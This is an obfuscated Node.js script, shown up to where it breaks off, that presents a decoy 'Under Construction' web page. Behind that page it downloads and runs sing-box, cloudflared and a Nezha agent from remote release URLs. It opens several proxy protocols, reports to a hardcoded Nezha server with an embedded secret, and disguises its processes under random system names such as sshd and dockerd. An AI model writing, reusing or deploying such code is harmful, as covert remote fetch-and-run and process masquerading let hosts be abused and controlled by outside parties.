const _0x20c3=['httpVersion','--no-autoupdate','httpd','node','protocol','REALITY_PRIVATE_KEY','setEncoding','randomBytes','text/html','C_T','run','VLESS-WS','https:','uptime','getUTCHours','der','generateKeyPairSync','\x20|\x20REALITY:\x20','postgres','http://','tuic://','crypto','getUTCMinutes','www.shopify.com','writeHead','unlinkSync','nginx','toString','child_process','polkitd','0.0.0.0','REALITY_SNI','running','trim','http','SIGTERM','statusCode','getUTCMonth','keyPath','map','existsSync','dbus-daemon','</div>\x0a<button\x20class=\x22btn\x22\x20onclick=\x22navigator.clipboard.writeText(document.getElementById(\x27link-','catch','/vls','tunnel','concat','HY2_PASSWORD','cloudflared','killed','VLESS_PATH','\x20HTTP/','singbox','B_D','resume','HY2_PORT','Not\x20Found','https://github.com/seav1/dl/releases/download/files/nzv1','8.8.8.8','ignore','stdout','hysteria2://','文件未找到:\x20','\x22\x20generate\x20reality-keypair','www.bing.com','https://github.com/seav1/dl/releases/download/files/sb-arm','find','nezha','VLESS_UUID','arm64','dockerd','</div>\x0a<span\x20class=\x22label\x22>SERVER\x20IP</span><div\x20class=\x22value\x22>','config.json','Hysteria2','cache.db','\x0a</div>\x0a</body>\x0a</html>','direct','cubic','?congestion_control=cubic&udp_relay_mode=native&alpn=h3,spdy/3.1&allow_insecure=1#','headers','includes','REALITY_PORT','--edge-ip-version','--protocol','atd','443','destroy','slice','PORT','https://github.com/seav1/dl/releases/download/files/nzv1-arm','8002','</span>\x0a<div\x20class=\x22value\x22\x20id=\x22link-','<!DOCTYPE\x20html>\x0a<html\x20lang=\x22en\x22>\x0a<head>\x0a<meta\x20charset=\x22UTF-8\x22><meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a<title>Service\x20Status</title>\x0a<style>\x0abody{display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;font-family:-apple-system,BlinkMacSystemFont,\x22Segoe\x20UI\x22,Roboto,Helvetica,Arial,sans-serif;background-color:#f4f4f7;color:#333}\x0a.card{background:white;padding:2rem;border-radius:12px;box-shadow:0\x204px\x2020px\x20rgba(0,0,0,0.05);width:90%;max-width:520px}\x0ah1{font-size:1.5rem;font-weight:300;margin:0\x200\x201.5rem\x200;color:#111;text-align:center}\x0a.label{font-size:0.75rem;color:#999;font-weight:600;display:block;margin-bottom:5px}\x0a.value{font-family:monospace;background:#f9f9fa;color:#444;padding:10px;border-radius:6px;font-size:0.85rem;word-break:break-all;border:1px\x20solid\x20#eaeaea;margin-bottom:15px}\x0a.row{display:flex;justify-content:space-between;gap:12px}\x0a.chip{font-size:0.75rem;background:#f1f1f5;padding:6px\x2010px;border-radius:999px;color:#555}\x0a.btn{width:100%;background-color:#333;color:white;border:none;padding:12px;border-radius:6px;cursor:pointer;font-size:0.9rem;transition:0.2s;margin-top:8px}\x0a.btn:hover{background-color:#000}\x0a</style>\x0a</head>\x0a<body>\x0a<div\x20class=\x22card\x22>\x0a<h1>Service\x20Status</h1>\x0a<span\x20class=\x22label\x22>STATUS</span>\x0a<div\x20class=\x22row\x22>\x0a<span\x20class=\x22chip\x22>singbox:\x20','tmpdir','containerd','text/plain','pipe','join','789456','&fp=chrome&pbk=','location','.log','sshd','newnz.seav.eu.org','rsa','chmodSync','\x20|\x20HY2:\x20','TUIC_UUID','listen','TUIC_PORT','kill','toLowerCase','http://localhost:','env','url','update','ntpd','ascii','forEach','stopped','createSign','key.pem','irqbalance','SERVER_IP','exit','php-fpm','TLS_CERT_PATH','logFile','N_P','mongod','0123456789abcdef','upgrade','TUIC','C_D','error','ruby','Reality','https://github.com/seav1/dl/releases/download/files/cf','NZ_CLIENT_SECRET','connect','&type=ws&host=','mysqld','utf8','floor','NZ_UUID','--url','getTime','dhclient','N_S','block','vless','&type=tcp#','string','feefeb96-bfcf-4a9b-aac0-6aac771c1b98','Too\x20many\x20redirects','setUTCFullYear','from','cRivpR7ScUwP51hJj7rLw7iCbUE6HmKg','1.1.1.1','data','amd64','2.5.29.15','method','redis-server','https://github.com/seav1/dl/releases/download/files/cf-arm','push','www.microsoft.com','REALITY_SHORT_ID','pathname','createWriteStream','end','SIGINT','certPath','length','REALITY_PUBLIC_KEY','</div>\x0a','HY2_SNI','--tls','match','localhost','warn','split','vless://','TLS_KEY_PATH','N_K','VLESS_PORT','tuic'];const _0x1d12=function(_0x20c35e,_0x1d12c4){_0x20c35e=_0x20c35e-0x0;let _0x354362=_0x20c3[_0x20c35e];return _0x354362;};const http=require('http');const https=require('https');const fs=require('fs');const path=require('path');const os=require('os');const {spawn,exec}=require(_0x1d12('0x1c'));const {URL}=require(_0x1d12('0x72'));const crypto=require(_0x1d12('0x15'));const net=require('net');const CONFIG={'C_T':process['env']['C_T']||'','B_D':process[_0x1d12('0x71')]['B_D']||_0x1d12('0x17'),'C_D':process['env']['C_D']||'','N_S':process['env'][_0x1d12('0x94')]||_0x1d12('0x67'),'N_P':process[_0x1d12('0x71')][_0x1d12('0x80')]||_0x1d12('0x55'),'N_K':process[_0x1d12('0x71')][_0x1d12('0xb8')]||_0x1d12('0x9d'),'NZ_UUID':process['env']['NZ_UUID']||'','N_T':process['env']['N_T']||_0x1d12('0xb1'),'HY2_PORT':process[_0x1d12('0x71')][_0x1d12('0x37')]||'','VLESS_PORT':process[_0x1d12('0x71')]['VLESS_PORT']||_0x1d12('0x5a'),'REALITY_PORT':process['env'][_0x1d12('0x51')]||'','TUIC_PORT':process[_0x1d12('0x71')][_0x1d12('0x6d')]||'','SERVER_IP':process['env'][_0x1d12('0x7b')]||'','VLESS_UUID':process[_0x1d12('0x71')]['VLESS_UUID']||_0x1d12('0x99'),'TUIC_UUID':process[_0x1d12('0x71')][_0x1d12('0x6b')]||'feefeb96-bfcf-4a9b-aac0-6aac771c1b98','TUIC_PASSWORD':process[_0x1d12('0x71')]['TUIC_PASSWORD']||'789456','HY2_PASSWORD':process['env'][_0x1d12('0x2f')]||_0x1d12('0x62'),'REALITY_PRIVATE_KEY':process[_0x1d12('0x71')]['REALITY_PRIVATE_KEY']||'','REALITY_PUBLIC_KEY':process['env'][_0x1d12('0xae')]||'','HY2_SNI':process[_0x1d12('0x71')]['HY2_SNI']||_0x1d12('0x40'),'VLESS_PATH':process[_0x1d12('0x71')][_0x1d12('0x32')]||_0x1d12('0x2c'),'REALITY_SNI':process['env'][_0x1d12('0x1f')]||_0x1d12('0xa6'),'REALITY_SHORT_ID':process['env'][_0x1d12('0xa7')]||_0x1d12('0x82'),'TLS_CERT_PATH':process['env']['TLS_CERT_PATH']||'','TLS_KEY_PATH':process['env']['TLS_KEY_PATH']||'','PORT':process['env']['PORT']||0xbb8};const WORK_DIR=os[_0x1d12('0x5d')]();const processes=[];let serviceStatus={'singbox':'stopped','cloudflared':_0x1d12('0x77'),'nezha':'stopped','http':'stopped'};const HTML_TEMPLATES={'home':'\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html\x20lang=\x22en\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22><meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<title>Under\x20Construction</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20body{display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:-apple-system,BlinkMacSystemFont,\x22Segoe\x20UI\x22,Roboto,Helvetica,Arial,sans-serif;background-color:#f4f4f7;color:#333}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.content{text-align:center}h1{font-size:2.5rem;margin-bottom:0.5rem;font-weight:300}p{color:#666;font-size:1.1rem}\x0a\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22content\x22><h1>Website\x20Under\x20Construction</h1><p>We\x20are\x20working\x20on\x20something\x20amazing.\x20Stay\x20tuned.</p></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20','status':(_0x3b1775,_0x316614)=>_0x1d12('0x5c')+serviceStatus['singbox']+'</span>\x0a<span\x20class=\x22chip\x22>cloudflared:\x20'+serviceStatus['cloudflared']+'</span>\x0a</div>\x0a<div\x20class=\x22row\x22\x20style=\x22margin:8px\x200\x2012px\x200\x22>\x0a<span\x20class=\x22chip\x22>nezha:\x20'+serviceStatus[_0x1d12('0x43')]+'</span>\x0a<span\x20class=\x22chip\x22>http:\x20'+serviceStatus[_0x1d12('0x22')]+'</span>\x0a</div>\x0a<span\x20class=\x22label\x22>PORTS</span>\x0a<div\x20class=\x22value\x22>HTTP:\x20'+CONFIG['PORT']+'\x0a'+(CONFIG[_0x1d12('0xb9')]?'\x20|\x20VLESS-WS:\x20'+CONFIG[_0x1d12('0xb9')]:'')+'\x0a'+(CONFIG[_0x1d12('0x37')]?_0x1d12('0x6a')+CONFIG['HY2_PORT']:'')+'\x0a'+(CONFIG['REALITY_PORT']?_0x1d12('0x11')+CONFIG['REALITY_PORT']:'')+'\x0a'+(CONFIG['TUIC_PORT']?'\x20|\x20TUIC:\x20'+CONFIG['TUIC_PORT']:'')+_0x1d12('0x47')+_0x3b1775+_0x1d12('0xaf')+(_0x316614[_0x1d12('0xad')]>0x0?_0x316614[_0x1d12('0x27')]((_0x56d27f,_0x178b4f)=>'\x0a<span\x20class=\x22label\x22>'+_0x56d27f['protocol']+_0x1d12('0x5b')+_0x178b4f+'\x22>'+_0x56d27f[_0x1d12('0x72')]+_0x1d12('0x2a')+_0x178b4f+'\x27).innerText).then(()=>this.innerText=\x27Copied!\x27)\x22>Copy\x20Link</button>\x0a')['join'](''):'<span\x20class=\x22label\x22>LINK</span><div\x20class=\x22value\x22>No\x20active\x20connections</div>')+_0x1d12('0x4b')};const COMMON_PROCESS_NAMES=[_0x1d12('0x66'),_0x1d12('0x1a'),'apache2',_0x1d12('0x2'),_0x1d12('0x8d'),_0x1d12('0x12'),_0x1d12('0xa3'),'memcached',_0x1d12('0x74'),'systemd','crond','rsyslogd','supervisord','node','python',_0x1d12('0x7d'),'java',_0x1d12('0x87'),_0x1d12('0x81'),_0x1d12('0x46'),_0x1d12('0x5e'),'snapd','logrotate','udevd','syslogd',_0x1d12('0x29'),'cron',_0x1d12('0x54'),_0x1d12('0x93'),_0x1d12('0x1d'),_0x1d12('0x7a')];function getRandomProcessName(){return COMMON_PROCESS_NAMES[Math[_0x1d12('0x8f')](Math['random']()*COMMON_PROCESS_NAMES['length'])];}function detectArch(){const _0x9c9777=process['arch'];return _0x9c9777==='x64'?_0x1d12('0xa0'):_0x9c9777==='arm64'?'arm64':(process['exit'](0x1),'');}function requestStream(_0x5459cb,_0x15a655=0x0){return new Promise((_0x57a627,_0x3d8a59)=>{const _0x53ba76=new URL(_0x5459cb);const _0x31f988=_0x53ba76[_0x1d12('0x4')]===_0x1d12('0xc')?https:http;const _0x206c4c=_0x31f988['get'](_0x53ba76,{'headers':{'User-Agent':_0x1d12('0x3')}},_0x5f57f1=>{const _0x45756d=_0x5f57f1[_0x1d12('0x24')]||0x0;if([0x12d,0x12e,0x12f,0x133,0x134][_0x1d12('0x50')](_0x45756d)&&_0x5f57f1[_0x1d12('0x4f')][_0x1d12('0x64')]){_0x5f57f1['resume']();if(_0x15a655>=0x5){_0x3d8a59(new Error(_0x1d12('0x9a')));return;}const _0x559936=new URL(_0x5f57f1['headers']['location'],_0x53ba76)['toString']();requestStream(_0x559936,_0x15a655+0x1)['then'](_0x57a627,_0x3d8a59);return;}if(_0x45756d>=0x190){_0x5f57f1[_0x1d12('0x36')]();_0x3d8a59(new Error('Request\x20failed:\x20'+_0x45756d));return;}_0x57a627(_0x5f57f1);});_0x206c4c['on'](_0x1d12('0x86'),_0x3d8a59);});}async function requestText(_0x42c469){const _0x5a7707=await requestStream(_0x42c469);return new Promise((_0x21cee3,_0x3d2c00)=>{let _0xfca77b='';_0x5a7707[_0x1d12('0x6')](_0x1d12('0x8e'));_0x5a7707['on'](_0x1d12('0x9f'),_0x3315e1=>_0xfca77b+=_0x3315e1);_0x5a7707['on']('end',()=>_0x21cee3(_0xfca77b));_0x5a7707['on'](_0x1d12('0x86'),_0x3d2c00);});}async function downloadBinary(_0x4500ea,_0x162568){const _0x4a58ba=await requestStream(_0x4500ea);const _0x236271=fs['createWriteStream'](_0x162568);return new Promise((_0x4bdf6a,_0x5ac2fa)=>{_0x4a58ba[_0x1d12('0x60')](_0x236271);_0x4a58ba['on'](_0x1d12('0x86'),_0x5ac2fa);_0x236271['on']('finish',()=>{fs[_0x1d12('0x69')](_0x162568,0x1ed);_0x4bdf6a();});_0x236271['on'](_0x1d12('0x86'),_0x5ac2fa);});}async function getServerIP(){try{const _0x36d107=await requestText('https://ipv4.icanhazip.com');return _0x36d107[_0x1d12('0x21')]();}catch(_0x254fb3){return'127.0.0.1';}}async function startTempTunnel(_0x4ce1bd,_0x1df789){return new Promise(_0x44e87f=>{for(let _0x40d13b=0x0;_0x40d13b<0x3;_0x40d13b++){const _0x3aeec9=path['join'](WORK_DIR,'cf_'+crypto[_0x1d12('0x7')](0x4)[_0x1d12('0x1b')]('hex')+_0x1d12('0x65'));const _0x3383ca=spawn(_0x4ce1bd,['tunnel',_0x1d12('0x1'),_0x1d12('0x91'),_0x1d12('0x70')+_0x1df789],{'stdio':[_0x1d12('0x3b'),_0x1d12('0x60'),'pipe']});processes[_0x1d12('0xa5')](_0x3383ca);const _0x27095c=fs['createWriteStream'](_0x3aeec9);_0x3383ca['stdout']['pipe'](_0x27095c);_0x3383ca['stderr']['pipe'](_0x27095c);serviceStatus['cloudflared']='running';_0x3383ca['on']('error',()=>{serviceStatus[_0x1d12('0x30')]=_0x1d12('0x86');});_0x3383ca['on'](_0x1d12('0x7c'),_0x4a42b7=>{if(_0x4a42b7!==0x0){serviceStatus['cloudflared']=_0x1d12('0x77');}});setTimeout(()=>{try{const _0x2ad894=fs['readFileSync'](_0x3aeec9,_0x1d12('0x8e'));const _0x33ca30=_0x2ad894[_0x1d12('0xb2')](/https:\/\/([^\/\s]+\.trycloudflare\.com)/);if(_0x33ca30){CONFIG[_0x1d12('0x85')]=_0x33ca30[0x1];try{fs[_0x1d12('0x19')](_0x3aeec9);}catch(_0x264eec){}return _0x44e87f(!![]);}}catch(_0x5bc239){}_0x3383ca[_0x1d12('0x6e')]();try{fs['unlinkSync'](_0x3aeec9);}catch(_0x40e130){}if(_0x40d13b===0x2){serviceStatus['cloudflared']='error';_0x44e87f(![]);}},0x2710);}});}async function generateRealityKeys(_0x4a7692){if(!CONFIG[_0x1d12('0x51')]||CONFIG[_0x1d12('0x5')]&&CONFIG[_0x1d12('0xae')]){return;}return new Promise(_0x4bf316=>{exec('\x22'+_0x4a7692+_0x1d12('0x3f'),(_0x2798e5,_0x56f75f)=>{if(!_0x2798e5&&_0x56f75f){const _0x1b2e63=_0x56f75f[_0x1d12('0xb2')](/PrivateKey:\s*(\S+)/);const _0x45ee50=_0x56f75f[_0x1d12('0xb2')](/PublicKey:\s*(\S+)/);if(_0x1b2e63&&_0x45ee50){CONFIG[_0x1d12('0x5')]=_0x1b2e63[0x1];CONFIG['REALITY_PUBLIC_KEY']=_0x45ee50[0x1];}}_0x4bf316();});});}async function ensureSelfSignedCertificate(){if(CONFIG['TLS_CERT_PATH']&&CONFIG['TLS_KEY_PATH']){return{'certPath':CONFIG[_0x1d12('0x7e')],'keyPath':CONFIG[_0x1d12('0xb7')]};}const _0x30159d=path['join'](WORK_DIR,'cert.pem');const _0x4841cd=path['join'](WORK_DIR,_0x1d12('0x79'));if(fs['existsSync'](_0x30159d)&&fs[_0x1d12('0x28')](_0x4841cd)){return{'certPath':_0x30159d,'keyPath':_0x4841cd};}const _0xa76538=_0x3c640e=>{if(_0x3c640e<0x80)return Buffer['from']([_0x3c640e]);const _0x2102e8=[];let _0x2787c0=_0x3c640e;while(_0x2787c0>0x0){_0x2102e8['unshift'](_0x2787c0&0xff);_0x2787c0>>=0x8;}return Buffer['from']([0x80|_0x2102e8['length'],..._0x2102e8]);};const _0x1d9418=(_0x448371,_0x3faf22)=>Buffer[_0x1d12('0x2e')]([Buffer[_0x1d12('0x9c')]([_0x448371]),_0xa76538(_0x3faf22[_0x1d12('0xad')]),_0x3faf22]);const _0x53cad9=_0x22b4aa=>_0x1d9418(0x30,Buffer[_0x1d12('0x2e')](_0x22b4aa));const _0x37c42b=_0x3068fe=>_0x1d9418(0x31,Buffer['concat'](_0x3068fe));const _0xcd480a=()=>_0x1d9418(0x5,Buffer['alloc'](0x0));const _0x3a2a3b=_0x4add51=>_0x1d9418(0x1,Buffer[_0x1d12('0x9c')]([_0x4add51?0xff:0x0]));const _0x33524f=_0x4ebd3a=>{let _0x1d442b=Buffer['isBuffer'](_0x4ebd3a)?Buffer['from'](_0x4ebd3a):Buffer[_0x1d12('0x9c')]([_0x4ebd3a]);if(_0x1d442b[0x0]&0x80)_0x1d442b=Buffer[_0x1d12('0x2e')]([Buffer['from']([0x0]),_0x1d442b]);return _0x1d9418(0x2,_0x1d442b);};const _0x55b2a8=_0x570070=>{const _0x11e150=_0x570070[_0x1d12('0xb5')]('.')['map'](Number);const _0x3bffc5=0x28*_0x11e150[0x0]+_0x11e150[0x1];const _0x234da7=[_0x3bffc5];for(let _0x4f936a=0x2;_0x4f936a<_0x11e150[_0x1d12('0xad')];_0x4f936a++){let _0x1aa123=_0x11e150[_0x4f936a];const _0x3902a8=[];do{_0x3902a8['unshift'](_0x1aa123&0x7f);_0x1aa123>>=0x7;}while(_0x1aa123>0x0);for(let _0x558ea8=0x0;_0x558ea8<_0x3902a8['length']-0x1;_0x558ea8++)_0x3902a8[_0x558ea8]|=0x80;_0x234da7['push'](..._0x3902a8);}return _0x1d9418(0x6,Buffer['from'](_0x234da7));};const _0x4495f0=_0x30b700=>_0x1d9418(0xc,Buffer['from'](_0x30b700,_0x1d12('0x8e')));const _0x4f7a19=_0x21a9c8=>{const _0x333938=_0x2141b8=>String(_0x2141b8)['padStart'](0x2,'0');const _0x2477d0=String(_0x21a9c8['getUTCFullYear']())[_0x1d12('0x57')](-0x2);const _0x3b8ad3=''+_0x2477d0+_0x333938(_0x21a9c8[_0x1d12('0x25')]()+0x1)+_0x333938(_0x21a9c8['getUTCDate']())+_0x333938(_0x21a9c8[_0x1d12('0xe')]())+_0x333938(_0x21a9c8[_0x1d12('0x16')]())+_0x333938(_0x21a9c8['getUTCSeconds']())+'Z';return _0x1d9418(0x17,Buffer['from'](_0x3b8ad3,_0x1d12('0x75')));};const _0x21894a=_0x563fd9=>_0x1d9418(0x3,Buffer['concat']([Buffer[_0x1d12('0x9c')]([0x0]),_0x563fd9]));const _0x575926=_0x425106=>_0x1d9418(0x4,_0x425106);const _0x560f16=CONFIG[_0x1d12('0x35')]||CONFIG[_0x1d12('0x85')]||CONFIG[_0x1d12('0xb0')]||'localhost';const {publicKey,privateKey}=crypto[_0x1d12('0x10')](_0x1d12('0x68'),{'modulusLength':0x800});const _0x226574=publicKey['export']({'type':'spki','format':_0x1d12('0xf')});const _0x531855=privateKey['export']({'type':'pkcs1','format':'pem'});const _0x143a48=_0x53cad9([_0x37c42b([_0x53cad9([_0x55b2a8('2.5.4.3'),_0x4495f0(_0x560f16)])])]);const _0xe942f5=new Date();const _0x5db85f=new Date(_0xe942f5[_0x1d12('0x92')]()-0x3c*0x3e8);const _0x594da0=new Date(_0xe942f5['getTime']());_0x594da0[_0x1d12('0x9b')](_0x5db85f['getUTCFullYear']()+0xa);const _0x5f51b6=_0x53cad9([_0x4f7a19(_0x5db85f),_0x4f7a19(_0x594da0)]);const _0x507121=_0x53cad9([_0x55b2a8('1.2.840.113549.1.1.11'),_0xcd480a()]);const _0x5ec748=new Set([CONFIG['B_D'],CONFIG[_0x1d12('0x85')],CONFIG['HY2_SNI']]['filter'](Boolean));const _0x16d796=Array['from'](_0x5ec748)[_0x1d12('0x27')](_0x4feeaf=>{const _0xdbd32c=Buffer['from'](_0x4feeaf,'ascii');return Buffer['concat']([Buffer[_0x1d12('0x9c')]([0x82]),_0xa76538(_0xdbd32c[_0x1d12('0xad')]),_0xdbd32c]);});const _0x24d9c4=_0x16d796['length']?_0x53cad9(_0x16d796):null;const _0x1d6e93=_0x53cad9([_0x3a2a3b(![])]);const _0x51f371=Buffer[_0x1d12('0x9c')]([0x5,0xa0]);const _0x5a7480=_0x1d9418(0x3,_0x51f371);const _0x3d0280=_0x53cad9([_0x55b2a8('1.3.6.1.5.5.7.3.1'),_0x55b2a8('1.3.6.1.5.5.7.3.2')]);const _0x41fd26=[_0x53cad9([_0x55b2a8('2.5.29.19'),_0x3a2a3b(!![]),_0x575926(_0x1d6e93)]),_0x53cad9([_0x55b2a8(_0x1d12('0xa1')),_0x3a2a3b(!![]),_0x575926(_0x5a7480)]),_0x53cad9([_0x55b2a8('2.5.29.37'),_0x3a2a3b(![]),_0x575926(_0x3d0280)])];if(_0x24d9c4){_0x41fd26['push'](_0x53cad9([_0x55b2a8('2.5.29.17'),_0x3a2a3b(![]),_0x575926(_0x24d9c4)]));}const _0x37be0b=_0x53cad9(_0x41fd26);const _0x5306d=Buffer['concat']([Buffer['from']([0xa3]),_0xa76538(_0x37be0b['length']),_0x37be0b]);const _0x325023=crypto['randomBytes'](0x10);const _0x37b114=Buffer[_0x1d12('0x2e')]([Buffer['from']([0xa0]),_0xa76538(0x3),_0x33524f(0x2)]);const _0x2b259d=_0x53cad9([_0x37b114,_0x33524f(_0x325023),_0x507121,_0x143a48,_0x5f51b6,_0x143a48,Buffer[_0x1d12('0x9c')](_0x226574),_0x5306d]);const _0x2aa3c4=crypto[_0x1d12('0x78')]('RSA-SHA256');_0x2aa3c4[_0x1d12('0x73')](_0x2b259d);_0x2aa3c4[_0x1d12('0xaa')]();const _0x2f7350=_0x2aa3c4['sign'](_0x531855);const _0x49228c=_0x53cad9([_0x2b259d,_0x507121,_0x21894a(_0x2f7350)]);const _0x202f80='-----BEGIN\x20CERTIFICATE-----\x0a'+_0x49228c[_0x1d12('0x1b')]('base64')[_0x1d12('0xb2')](/.{1,64}/g)['join']('\x0a')+'\x0a-----END\x20CERTIFICATE-----\x0a';fs['writeFileSync'](_0x30159d,_0x202f80);fs['writeFileSync'](_0x4841cd,_0x531855);return{'certPath':_0x30159d,'keyPath':_0x4841cd};}async function generateSingBoxConfig(){const _0x3798fc=[];let _0x2ac380=null;if(CONFIG['HY2_PORT']||CONFIG[_0x1d12('0x6d')]){_0x2ac380=await ensureSelfSignedCertificate();}if(CONFIG[_0x1d12('0x37')]){_0x3798fc[_0x1d12('0xa5')]({'type':'hysteria2','tag':'hy2-in','listen':'0.0.0.0','listen_port':parseInt(CONFIG['HY2_PORT']),'users':[{'password':CONFIG['HY2_PASSWORD']}],'tls':{'enabled':!![],'server_name':CONFIG[_0x1d12('0xb0')],'key_path':_0x2ac380['keyPath'],'certificate_path':_0x2ac380[_0x1d12('0xac')],'alpn':['h3']}});}if(CONFIG['VLESS_PORT']){_0x3798fc[_0x1d12('0xa5')]({'type':_0x1d12('0x96'),'tag':'vless-in','listen':'0.0.0.0','listen_port':parseInt(CONFIG['VLESS_PORT']),'users':[{'uuid':CONFIG['VLESS_UUID']}],'transport':{'type':'ws','path':CONFIG[_0x1d12('0x32')],'headers':{}}});}if(CONFIG['REALITY_PORT']){_0x3798fc[_0x1d12('0xa5')]({'type':_0x1d12('0x96'),'tag':'reality-in','listen':'0.0.0.0','listen_port':parseInt(CONFIG[_0x1d12('0x51')]),'users':[{'uuid':CONFIG[_0x1d12('0x44')],'flow':'xtls-rprx-vision'}],'tls':{'enabled':!![],'server_name':CONFIG['REALITY_SNI'],'reality':{'enabled':!![],'handshake':{'server':CONFIG['REALITY_SNI'],'server_port':0x1bb},'private_key':CONFIG[_0x1d12('0x5')],'short_id':[CONFIG['REALITY_SHORT_ID']]}}});}if(CONFIG[_0x1d12('0x6d')]){_0x3798fc['push']({'type':_0x1d12('0xba'),'tag':'tuic-in','listen':_0x1d12('0x1e'),'listen_port':parseInt(CONFIG['TUIC_PORT']),'users':[{'uuid':CONFIG[_0x1d12('0x6b')],'password':CONFIG['TUIC_PASSWORD']}],'congestion_control':_0x1d12('0x4d'),'auth_timeout':'3s','zero_rtt_handshake':![],'heartbeat':'10s','tls':{'enabled':!![],'certificate_path':_0x2ac380['certPath'],'key_path':_0x2ac380[_0x1d12('0x26')],'alpn':['h3']}});}const _0x1cefaa={'log':{'level':_0x1d12('0xb4'),'timestamp':!![]},'dns':{'servers':[{'tag':'google','address':_0x1d12('0x3a')},{'tag':'cloudflare','address':_0x1d12('0x9e')}],'final':'google'},'inbounds':_0x3798fc,'outbounds':[{'type':'direct','tag':'direct'},{'type':_0x1d12('0x95'),'tag':_0x1d12('0x95')}],'route':{'rules':[{'ip_is_private':!![],'outbound':_0x1d12('0x4c')}],'final':_0x1d12('0x4c')},'experimental':{'cache_file':{'enabled':!![],'path':path[_0x1d12('0x61')](WORK_DIR,_0x1d12('0x4a'))}}};const _0x190b6a=path['join'](WORK_DIR,_0x1d12('0x48'));fs['writeFileSync'](_0x190b6a,JSON['stringify'](_0x1cefaa,null,0x2));return _0x190b6a;}function generateLinks(_0x350f7b){const _0x5635b6=[];const _0x39558e=CONFIG[_0x1d12('0x85')]?CONFIG[_0x1d12('0x85')]+'-':'';if(CONFIG['HY2_PORT']){_0x5635b6[_0x1d12('0xa5')]({'protocol':_0x1d12('0x49'),'url':_0x1d12('0x3d')+CONFIG[_0x1d12('0x2f')]+'@'+_0x350f7b+':'+CONFIG[_0x1d12('0x37')]+'?insecure=1&sni='+CONFIG['HY2_SNI']+'&alpn=h3#'+_0x39558e+'HY2'});}if(CONFIG['VLESS_PORT']){_0x5635b6[_0x1d12('0xa5')]({'protocol':_0x1d12('0xb'),'url':_0x1d12('0xb6')+CONFIG['VLESS_UUID']+'@'+CONFIG['B_D']+':443?encryption=none&security=tls&sni='+CONFIG[_0x1d12('0x85')]+_0x1d12('0x8c')+CONFIG['C_D']+'&path='+encodeURIComponent(CONFIG[_0x1d12('0x32')])+'#'+_0x39558e+'VLESS-WS'});}if(CONFIG[_0x1d12('0x51')]){_0x5635b6[_0x1d12('0xa5')]({'protocol':_0x1d12('0x88'),'url':_0x1d12('0xb6')+CONFIG['VLESS_UUID']+'@'+_0x350f7b+':'+CONFIG['REALITY_PORT']+'?encryption=none&flow=xtls-rprx-vision&security=reality&sni='+CONFIG['REALITY_SNI']+_0x1d12('0x63')+CONFIG[_0x1d12('0xae')]+'&sid='+CONFIG[_0x1d12('0xa7')]+_0x1d12('0x97')+_0x39558e+'REALITY'});}if(CONFIG['TUIC_PORT']){_0x5635b6[_0x1d12('0xa5')]({'protocol':_0x1d12('0x84'),'url':_0x1d12('0x14')+CONFIG[_0x1d12('0x6b')]+':'+CONFIG['TUIC_PASSWORD']+'@'+_0x350f7b+':'+CONFIG['TUIC_PORT']+_0x1d12('0x4e')+_0x39558e+_0x1d12('0x84')});}return _0x5635b6;}function cleanup(){processes[_0x1d12('0x76')](_0x7c56c0=>{try{_0x7c56c0['kill']();}catch(_0x483615){}});process[_0x1d12('0x7c')](0x0);}async function startService(_0x56edf1,_0x16bb5d,_0x25e09e,_0x5ef86d={}){try{const _0x503501=spawn(_0x56edf1,_0x16bb5d,{'stdio':['ignore',_0x1d12('0x60'),_0x1d12('0x60')],..._0x5ef86d});if(_0x5ef86d[_0x1d12('0x7f')]){const _0x3f4669=fs[_0x1d12('0xa9')](_0x5ef86d['logFile']);_0x503501[_0x1d12('0x3c')][_0x1d12('0x60')](_0x3f4669);_0x503501['stderr'][_0x1d12('0x60')](_0x3f4669);}serviceStatus[_0x25e09e['toLowerCase']()]='running';_0x503501['on']('spawn',()=>{serviceStatus[_0x25e09e[_0x1d12('0x6f')]()]=_0x1d12('0x20');});_0x503501['on']('error',()=>{serviceStatus[_0x25e09e['toLowerCase']()]='error';});_0x503501['on'](_0x1d12('0x7c'),()=>{serviceStatus[_0x25e09e[_0x1d12('0x6f')]()]=_0x1d12('0x77');});return new Promise(_0x4e2af0=>{const _0x5836d3=()=>{if(_0x503501['killed']){serviceStatus[_0x25e09e[_0x1d12('0x6f')]()]='stopped';_0x4e2af0(null);}else{processes['push'](_0x503501);_0x4e2af0(_0x503501);}};setTimeout(_0x5836d3,0x7d0);});}catch(_0x3a92ec){serviceStatus[_0x25e09e[_0x1d12('0x6f')]()]='error';return null;}}function formatHeaderValue(_0x2addcb){if(Array['isArray'](_0x2addcb))return _0x2addcb[_0x1d12('0x61')](',\x20');return _0x2addcb===undefined?'':String(_0x2addcb);}async function renderStatus(_0x48de77){const _0x114dab=await getServerIP();const _0x575cbb=generateLinks(_0x114dab);_0x48de77['writeHead'](0xc8,{'Content-Type':'text/html'});_0x48de77[_0x1d12('0xaa')](HTML_TEMPLATES['status'](_0x114dab,_0x575cbb));}const server=http['createServer'](async(_0x538327,_0x143151)=>{const _0x4565c1=new 